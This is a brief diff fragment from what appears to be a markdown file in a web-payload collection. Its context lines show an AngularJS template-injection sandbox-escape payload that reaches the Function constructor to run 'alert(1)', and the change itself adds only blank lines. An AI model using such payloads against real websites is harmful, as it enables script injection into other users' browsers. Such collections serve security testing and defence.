@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:51.896096+00:00'
 ```javascript
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 ```
+
+
